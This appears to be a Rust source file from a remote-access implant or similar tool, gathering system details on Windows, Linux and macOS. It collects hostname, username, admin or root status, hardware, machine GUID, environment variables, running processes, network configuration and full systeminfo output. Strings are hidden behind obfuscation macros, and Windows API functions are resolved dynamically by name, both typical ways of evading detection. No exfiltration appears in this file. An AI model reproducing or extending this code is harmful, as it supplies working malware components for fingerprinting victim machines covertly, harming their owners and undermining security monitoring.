use std::collections::HashSet;
use std::time::{Duration, };
use crate::data::SystemInfo;
use crate::runtime::*; // 提供s系列字符串混淆宏
use crate::utils::sys::{get_hostname_sysapi, get_username_sysapi};
use crate::utils::awk::{awk, AwkResult, Line};
use crate::shell::exec; // exec内部已自动处理跨平台，编码，shell差异
#[cfg(windows)]
use crate::utils::win::{resolve, win_fn};

#[cfg(windows)]
async fn run_powershell(input: &str, idle: u64) -> Option<String> {
    use crate::shell::shell::powershell;
    let powershell = powershell().await;
    let mut pwsh = powershell.lock().await;
    pwsh.send_line(input).await;
    let mut out = pwsh.output(Some(Duration::from_millis(idle))).await;
    if out.is_empty() {
        out = pwsh.output(Some(Duration::from_millis(idle))).await;
        if out.is_empty() {
            return None;
        }
    }
    Some(out)
}

pub fn collect_hostname() -> String {
    get_hostname_sysapi().map(|hs| hs.to_string()).unwrap_or_default()
}
pub fn collect_username() -> String {
    get_username_sysapi().map(|hs| hs.to_string()).unwrap_or_default()
}

pub fn collect_pid() -> i64 {
    std::process::id() as i64
}
pub fn collect_process_path() -> String {
    std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| sss!("unknown"))
}
pub fn collect_os() -> String {
    std::env::consts::OS.to_string()
}
pub fn collect_arch() -> String {
    std::env::consts::ARCH.to_string()
}
pub fn collect_env() -> std::collections::HashMap<String, String> {
    std::env::vars().collect()
}

pub fn collect_ip() -> String {
    let mut default = "127.0.0.1".to_string();
    if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
        if let Ok(_) = socket.connect("8.8.8.8:53") {
            if let Ok(addr) = socket.local_addr() {
                default = addr.ip().to_string();
            }
        }
    }
    default
}

pub async fn collect_user_permissions() -> String {
    #[cfg(windows)]
    {
        use std::ffi::c_void;

        type FnGetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
        type FnOpenProcessToken = unsafe extern "system" fn(process_handle: *mut c_void, desired_access: u32, token_handle: *mut *mut c_void) -> i32;
        type FnGetTokenInformation = unsafe extern "system" fn(token_handle: *mut c_void, token_information_class: u32, token_information: *mut c_void, token_information_length: u32, return_length: *mut u32) -> i32;
        type FnCloseHandle = unsafe extern "system" fn(handle: *mut c_void) -> i32;

        const TOKEN_QUERY: u32 = 0x0008;
        const TOKEN_ELEVATION_CLASS: u32 = 20;

        #[repr(C)]
        #[allow(non_camel_case_types)]
        struct TOKEN_ELEVATION {
            token_is_elevated: u32,
        }

        let check_is_admin = || -> Option<bool> {
            let get_current_process: FnGetCurrentProcess = resolve(ss!("kernel32.dll"), ss!("GetCurrentProcess"))?;
            let open_process_token: FnOpenProcessToken = resolve(ss!("advapi32.dll"), ss!("OpenProcessToken"))?;
            let get_token_info: FnGetTokenInformation = resolve(ss!("advapi32.dll"), ss!("GetTokenInformation"))?;
            let close_handle: FnCloseHandle = resolve(ss!("kernel32.dll"), ss!("CloseHandle"))?;

            unsafe {
                let process = get_current_process();
                let mut token: *mut c_void = std::ptr::null_mut();

                if open_process_token(process, TOKEN_QUERY, &mut token) == 0 {
                    return Some(false);
                }

                let mut elevation = TOKEN_ELEVATION { token_is_elevated: 0 };
                let mut size = 0;

                let success = get_token_info(
                    token,
                    TOKEN_ELEVATION_CLASS,
                    &mut elevation as *mut _ as *mut c_void,
                    std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                    &mut size,
                );

                close_handle(token);

                if success != 0 {
                    return Some(elevation.token_is_elevated != 0);
                }
                Some(false)
            }
        };

        if check_is_admin().unwrap_or(false) {
            return sss!("administrator");
        } else {
            return sss!("user");
        }
    }

    #[cfg(not(windows))]
    {
        let euid = unsafe { libc::geteuid() };
        if euid == 0 {
            return sss!("root");
        }
        if let Ok(out) = exec(ss!("id"), ss!("sh"), None).await {
            let out = out.stdout;
            if out.contains(ss!("sudo")) || out.contains(ss!("wheel")) {
                return sss!("sudo_user");
            }
        }
        sss!("user")
    }
}


pub async fn collect_os_version() -> String {
    #[cfg(target_os = "linux")]
    {
        if let Ok(version) = tokio::fs::read_to_string("/etc/os-release").await {
            if let Ok(res) = awk(&version, vec!["\""], vec!["\n"]) {
                for line in res.lines {
                    if let Some(f1) = line.get(1) {
                        if f1 == "PRETTY_NAME=" {
                            if let Some(f2) = line.get(2) {
                                return f2.to_string();
                            }
                        }
                    }
                }
            }
        }
        sss!("unknown")
    }
    #[cfg(target_os = "windows")]
    {   // Windows 11 25H2
        if let Some(version) = crate::utils::sys::win::get_os_version_reg() {
            return version.version();
        }
        sss!("unknown")
    }
    #[cfg(target_os = "macos")]
    {    // macOS 15.5
        if let Ok(name) = exec(ss!("sw_vers -productName"), ss!("sh"), None).await {
            if let Ok(version) = exec(ss!("sw_vers -productVersion"), ss!("sh"), None).await {
                return format!(
                    "{} {}",
                    name.stdout.trim(),
                    version.stdout.trim()
                );
            }
        }
        sss!("unknown")
    }
}

pub async fn collect_os_build() -> String {
    #[cfg(target_os = "windows")]
    {
        // 19045.3803
        if let Some(version) = crate::utils::sys::win::get_os_version_reg() {
            return version.full_build();
        }
        sss!("unknown")
    }

    #[cfg(target_os = "linux")]
    {
        // 6.6.15-amd64
        if let Ok(out) = exec(ss!("uname -r"), ss!("sh"), None).await {
            return out.stdout.trim().to_string();
        }
        sss!("unknown")
    }

    #[cfg(target_os = "macos")]
    {
        // 24F74
        if let Ok(out) = exec(ss!("sw_vers -buildVersion"), ss!("sh"), None).await {
            return out.stdout.trim().to_string();
        }
        sss!("unknown")
    }
}
pub async fn collect_cpu() -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = tokio::fs::read_to_string("/proc/cpuinfo").await {
            if let Ok(res) = awk(&content, [":"], ["\n"]) {
                let cpus = res.filter(|line| line.get(1).map(|s| s.trim() == "model name").unwrap_or(false));
                let mut set = HashSet::new();
                for line in cpus {
                    if let Some(cpu) = line.get(2) {
                        set.insert(cpu.trim().to_string());
                    }
                }
                return set.into_iter().collect();
            }
        }
        vec![]
    }

    #[cfg(target_os = "macos")]
    {
        exec(ss!("sysctl -n machdep.cpu.brand_string"), ss!("sh"), None)
            .await
            .map(|out| vec![out.stdout.trim().to_string()])
            .unwrap_or_else(|_| vec![])
    }

    #[cfg(windows)]
    {
        use crate::utils::win::win_types::registry::{HKEY_LOCAL_MACHINE, KEY_READ};
        use crate::utils::win::reg::RegKey;

        let check_cpu = || -> anyhow::Result<String> {
            let key = RegKey::open(
                HKEY_LOCAL_MACHINE,
                ss!("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"),
                0,
                KEY_READ
            )?;

            let val = key.query_value(ss!("ProcessorNameString"))?;

            if let Some(cpu_name) = val.as_string() {
                return Ok(cpu_name.trim().to_string());
            }

            anyhow::bail!(s!("Invalid registry value type"))
        };

        check_cpu()
            .map(|cpu| vec![cpu])
            .unwrap_or_else(|_| vec![])
    }
}

pub async fn collect_gpu() -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(out) = exec(ss!("lspci"), ss!("sh"), None).await {
            if let Ok(res) = awk(&out.stdout, [":", "(", ")"], ["\n"]) {
                let gpus = res.filter(
                    |line| {
                        line.get(2)
                            .map(|s| s.contains("3D controlle") || s.contains("VGA"))
                            .unwrap_or(false)
                    });
                let mut out = Vec::<String>::new();
                for line in gpus {
                    if let Some(gpu) = line.get(3) {
                        out.push(gpu.trim().to_string());
                    }
                }
                return out;
            }
        }
        vec![]
    }

    #[cfg(windows)]
    {
        if let Some(out) = run_powershell(
            ss!("Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"),
            200
        ).await {
            let mut gpus = HashSet::new();
            for line in out.lines() {
                let gpu_name = line.trim();
                if !gpu_name.is_empty() {
                    gpus.insert(gpu_name.to_string());
                }
            }
            return gpus.into_iter().collect();
        }
        vec![]

    }
    #[cfg(target_os = "macos")]
    {
        if let Ok(out) = exec(ss!("system_profiler SPDisplaysDataType"), ss!("sh"), None).await {
            let mut gpus = HashSet::new();

            for line in out.stdout.lines() {
                let trimmed_line = line.trim();
                if trimmed_line.starts_with("Chipset Model:") {
                    if let Some((_, gpu_name)) = trimmed_line.split_once(':') {
                        let name = gpu_name.trim();
                        if !name.is_empty() {
                            gpus.insert(name.to_string());
                        }
                    }
                }
            }
            return gpus.into_iter().collect();
        }
        vec![]
    }
}

pub async fn collect_memory() -> String {
    #[cfg(windows)]
    {
        if let Some(out) = run_powershell(
            ss!("(Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory; (Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"),
            200
        ).await {
            let lines: Vec<&str> = out
                .lines()
                .map(|l| l.trim())
                .filter(|l| !l.is_empty())
                .collect();

            if lines.len() >= 2 {
                let free_kb: u64 = lines[0].parse().unwrap_or(0);
                let total_kb: u64 = lines[1].parse().unwrap_or(0);

                if total_kb > 0 {
                    let free_gb = free_kb as f64 / 1_048_576.0;
                    let total_gb = total_kb as f64 / 1_048_576.0;
                    return format!("{:.2} GB / {:.2} GB", free_gb, total_gb);
                }
            }
        }
        return sss!("unknown");
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = tokio::fs::read_to_string("/proc/meminfo").await {
            let mut total_kb: u64 = 0;
            let mut free_kb: u64 = 0;
            let mut available_kb: Option<u64> = None;

            for line in content.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 {
                    match parts[0] {
                        "MemTotal:" => total_kb = parts[1].parse().unwrap_or(0),
                        "MemAvailable:" => available_kb = Some(parts[1].parse().unwrap_or(0)),
                        "MemFree:" => free_kb = parts[1].parse().unwrap_or(0),
                        _ => {}
                    }
                }
            }

            let free_to_use = available_kb.unwrap_or(free_kb);

            if total_kb > 0 {
                let free_gb = free_to_use as f64 / 1_048_576.0;
                let total_gb = total_kb as f64 / 1_048_576.0;
                return format!("{:.2} GB / {:.2} GB", free_gb, total_gb);
            }
        }
        return sss!("unknown");
    }

    #[cfg(target_os = "macos")]
    {
        let mut total_bytes: u64 = 0;
        let mut free_bytes: u64 = 0;

        if let Ok(out) = exec(ss!("sysctl -n hw.memsize"), ss!("sh"), None).await {
            if let Ok(bytes) = out.stdout.trim().parse::<u64>() {
                total_bytes = bytes;
            }
        }

        let mut page_size: u64 = 4096;
        if let Ok(out) = exec(ss!("sysctl -n hw.pagesize"), ss!("sh"), None).await {
            if let Ok(ps) = out.stdout.trim().parse::<u64>() {
                page_size = ps;
            }
        }

        if let Ok(out) = exec(ss!("vm_stat"), ss!("sh"), None).await {
            let mut free_pages: u64 = 0;
            for line in out.stdout.lines() {
                let line = line.trim();
                if line.starts_with("Pages free:") ||
                    line.starts_with("Pages inactive:") ||
                    line.starts_with("Pages speculative:") {
                    let parts: Vec<&str> = line.split(':').collect();
                    if parts.len() == 2 {
                        let pages_str = parts[1].trim().trim_end_matches('.');
                        if let Ok(pages) = pages_str.parse::<u64>() {
                            free_pages += pages;
                        }
                    }
                }
            }
            free_bytes = free_pages * page_size;
        }

        if total_bytes > 0 {
            // Bytes 转换为 GB (除以 1024 * 1024 * 1024)
            let free_gb = free_bytes as f64 / 1_073_741_824.0;
            let total_gb = total_bytes as f64 / 1_073_741_824.0;
            return format!("{:.2} GB / {:.2} GB", free_gb, total_gb);
        }
        return sss!("unknown");
    }

    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        sss!("unknown")
    }
}
pub async fn collect_disk() -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(out) = exec(ss!("lsblk -b -d -o NAME,TYPE,SIZE"), ss!("sh"), None).await {
            let mut disks = Vec::new();

            for line in out.stdout.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 3 && parts[1] == "disk" {
                    let name = parts[0];
                    if let Ok(bytes) = parts[2].parse::<u64>() {
                        // 统一计算为 GB
                        let gb = bytes as f64 / 1_073_741_824.0;
                        disks.push(format!("/dev/{} {:.2} GB", name, gb));
                    }
                }
            }
            return disks;
        }
        vec![]
    }

    #[cfg(windows)]
    {
        if let Some(out) = run_powershell(
            ss!("Get-CimInstance Win32_DiskDrive | ForEach-Object { \"$($_.Caption)|$($_.InterfaceType)|$($_.Size)\" }"),
            200
        ).await {
            let mut disks = Vec::new();

            for line in out.lines() {
                let parts: Vec<&str> = line.split('|').collect();
                if parts.len() == 3 {
                    let name = parts[0].trim();
                    let interface = parts[1].trim(); // 比如 USB, IDE, SCSI

                    if let Ok(bytes) = parts[2].trim().parse::<u64>() {
                        let gb = bytes as f64 / 1_073_741_824.0;
                        disks.push(format!("{} [{}] {:.2} GB", name, interface, gb));
                    }
                }
            }
            return disks;
        }
        vec![]
    }

    #[cfg(target_os = "macos")]
    {
        if let Ok(out) = exec(ss!("diskutil info -all"), ss!("sh"), None).await {
            let mut disks = Vec::new();
            let mut current_id = String::new();

            for line in out.stdout.lines() {
                let line = line.trim();

                if line.starts_with("Device Identifier:") {
                    current_id = line.replace("Device Identifier:", "").trim().to_string();
                }
                else if line.starts_with("Total Size:") || line.starts_with("Disk Size:") {
                    if let Some(start) = line.find('(') {
                        if let Some(end) = line.find(" Bytes)") {
                            if end > start + 1 {
                                let bytes_str = &line[start + 1..end];
                                if let Ok(bytes) = bytes_str.parse::<u64>() {
                                    let gb = bytes as f64 / 1_073_741_824.0;
                                    if !current_id.is_empty() {
                                        disks.push(format!("/dev/{} {:.2} GB", current_id, gb));
                                        current_id.clear();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return disks;
        }
        vec![]
    }

    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        vec![]
    }
}

pub async fn collect_running_processes() -> String {
    #[cfg(windows)]
    {
        if let Ok(out) = exec(ss!("tasklist /svc"), ss!("cmd"), None).await {
            return out.stdout;
        }
        sss!("unknown")
    }
    #[cfg(not(windows))]
    {
        if let Ok(out) = exec(ss!("ps aux"), ss!("sh"), None).await {
            return out.stdout;
        }
        sss!("unknown")
    }
}
pub async fn collect_network_info() -> String {
    #[cfg(windows)]
    {
        if let Ok(out) = exec(ss!("ipconfig /all"), ss!("cmd"), None).await {
            return out.stdout;
        }
        sss!("unknown")
    }
    #[cfg(not(windows))]
    {
        if let Ok(out) = exec(ss!("ip addr"), ss!("sh"), None).await {
            if let Ok(out) = out.ok() {
                return out
            }
            if let Ok(out) = exec(ss!("ifconfig -a"), ss!("sh"), None).await {
                if let Ok(out) = out.ok() {
                    return out
                }
            }
        }
        sss!("unknown")
    }
}

pub async fn collect_system_info() -> String {
    #[cfg(windows)]
    {
        if let Ok(out) = exec(ss!("systeminfo"), ss!("cmd"), None).await {
            return out.stdout;
        }
        sss!("unknown")
    }
    #[cfg(target_os = "linux")]
    {
        if let Ok(out) = exec(ss!("fastfetch"), ss!("sh"), None).await {
            if let Ok(out) = out.ok() {
                return out
            }
            if let Ok(out) = exec(ss!("neofetch"), ss!("sh"), None).await {
                if let Ok(out) = out.ok() {
                    return out
                }
                if let Ok(out) = exec(ss!("hostnamectl"), ss!("sh"), None).await {
                    if let Ok(out) = out.ok() {
                        return out
                    }
                }
            }
        }
        sss!("unknown")
    }
    #[cfg(target_os = "macos")]
    {
        if let Ok(out) = exec(ss!("system_profiler SPSoftwareDataType SPHardwareDataType"), ss!("sh"), None).await {
            return out.stdout;
        }
        sss!("unknown")
    }
}

pub async fn collect_machine_id() -> String {
    #[cfg(windows)]
    {
        use crate::utils::win::win_types::registry::{HKEY_LOCAL_MACHINE, KEY_READ};
        use crate::utils::win::reg::RegKey;

        let check_guid = || -> Option<String> {
            let key = RegKey::open(
                HKEY_LOCAL_MACHINE,
                ss!("SOFTWARE\\Microsoft\\Cryptography"),
                0,
                KEY_READ
            ).ok()?;

            let val = key.query_value(ss!("MachineGuid")).ok()?;

            if let Some(guid) = val.as_string() {
                return Some(guid.trim().to_string());
            }
            None
        };

        if let Some(guid) = check_guid() {
            if !guid.is_empty() {
                return guid;
            }
        }

        sss!("unknown")
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(id) = tokio::fs::read_to_string("/etc/machine-id").await {
            let id = id.trim();
            if !id.is_empty() {
                return id.to_string();
            }
        }
        if let Ok(id) = tokio::fs::read_to_string("/var/lib/dbus/machine-id").await {
            let id = id.trim();
            if !id.is_empty() {
                return id.to_string();
            }
        }

        sss!("unknown")
    }

    #[cfg(target_os = "macos")]
    {
        // 提取 IOPlatformUUID
        if let Ok(out) = exec(ss!("ioreg -rd1 -c IOPlatformExpertDevice"), ss!("sh"), None).await {
            for line in out.stdout.lines() {
                if line.contains("IOPlatformUUID") {
                    // 典型的输出格式: "IOPlatformUUID" = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
                    let parts: Vec<&str> = line.split('"').collect();
                    if parts.len() >= 4 {
                        let uuid = parts[3].trim();
                        if !uuid.is_empty() {
                            return uuid.to_string();
                        }
                    }
                }
            }
        }

        sss!("unknown")
    }

    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        sss!("unknown")
    }
}


pub async fn collect_all() -> SystemInfo {
    // 先用默认值初始化（其中已经包含 env / pid / process_path / os / arch / ip）
    let mut info = SystemInfo::default();

    let hostname = collect_hostname();
    let username = collect_username();

    let (
        user_permissions,
        os_version,
        os_build,
        cpu,
        gpu,
        memory,
        disk,
        machine_id,
        systeminfo,
        network_info,
        running_processes,
    ) = tokio::join!(
        collect_user_permissions(),
        collect_os_version(),
        collect_os_build(),
        collect_cpu(),
        collect_gpu(),
        collect_memory(),
        collect_disk(),
        collect_machine_id(),
        collect_system_info(),
        collect_network_info(),
        collect_running_processes(),
    );

    info.hostname = Some(hostname);
    info.username = Some(username);
    info.user_permissions = Some(user_permissions);

    info.os_version = Some(os_version);
    info.os_build = Some(os_build);

    info.cpu = Some(cpu);
    info.gpu = Some(gpu);
    info.memory = Some(memory);
    info.disk = Some(disk);
    info.machine_id = Some(machine_id);
    info.systeminfo = Some(systeminfo);

    info.network_info = Some(network_info);
    info.running_processes = Some(running_processes);

    info
}

pub async fn collect(items: impl IntoIterator<Item = impl AsRef<str>>) -> SystemInfo {
    let mut info = SystemInfo::default();

    let requested: HashSet<String> = items
        .into_iter()
        .map(|s| s.as_ref().to_lowercase())
        .collect();

    let has = |key: &str| requested.contains(key);

    if has(ss!("hostname")) {
        info.hostname = Some(collect_hostname());
    }
    if has(ss!("username")) {
        info.username = Some(collect_username());
    }

    let (
        user_permissions,
        os_version,
        os_build,
        cpu,
        gpu,
        memory,
        disk,
        machine_id,
        systeminfo,
        network_info,
        running_processes,
    ) = tokio::join!(
        async { if has(ss!("user_permissions")) { Some(collect_user_permissions().await) } else { None } },
        async { if has(ss!("os_version")) { Some(collect_os_version().await) } else { None } },
        async { if has(ss!("os_build")) { Some(collect_os_build().await) } else { None } },
        async { if has(ss!("cpu")) { Some(collect_cpu().await) } else { None } },
        async { if has(ss!("gpu")) { Some(collect_gpu().await) } else { None } },
        async { if has(ss!("memory")) { Some(collect_memory().await) } else { None } },
        async { if has(ss!("disk")) { Some(collect_disk().await) } else { None } },
        async { if has(ss!("machine_id")) { Some(collect_machine_id().await) } else { None } },
        async { if has(ss!("systeminfo")) { Some(collect_system_info().await) } else { None } },
        async { if has(ss!("network_info")) { Some(collect_network_info().await) } else { None } },
        async { if has(ss!("running_processes")) { Some(collect_running_processes().await) } else { None } },
    );

    info.user_permissions = user_permissions;
    info.os_version = os_version;
    info.os_build = os_build;
    info.cpu = cpu;
    info.gpu = gpu;
    info.memory = memory;
    info.disk = disk;
    info.machine_id = machine_id;
    info.systeminfo = systeminfo;
    info.network_info = network_info;
    info.running_processes = running_processes;

    info
}


#[cfg(test)]
mod test {

    use super::*;
    #[tokio::test]
    async fn test_system_info() {
        let info = collect_all().await;
        println!("{:#?}", info);
    }
}